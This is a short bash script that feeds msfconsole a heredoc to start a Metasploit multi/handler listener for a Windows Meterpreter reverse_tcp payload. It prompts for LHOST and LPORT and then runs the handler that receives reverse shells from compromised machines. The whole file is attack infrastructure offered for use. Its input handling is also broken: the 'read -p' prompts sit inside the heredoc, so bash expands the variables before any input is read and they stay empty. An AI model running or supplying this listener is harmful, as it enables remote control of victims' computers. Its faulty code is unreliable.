#!/bin/bash

# Step 1: Launch msfconsole
msfconsole <<EOF

# Step 2: Use multi/handler
use multi/handler

# Step 3: Set payload
set payload windows/meterpreter/reverse_tcp

# Step 4: Show options
show options

# Step 5: Get user input for LHOST
read -p "Enter LHOST (your IP address): " lhost
setg LHOST $lhost

# Step 6: Get user input for LPORT
read -p "Enter LPORT: " lport
setg LPORT $lport

# Step 7: Run the listener
run

EOF
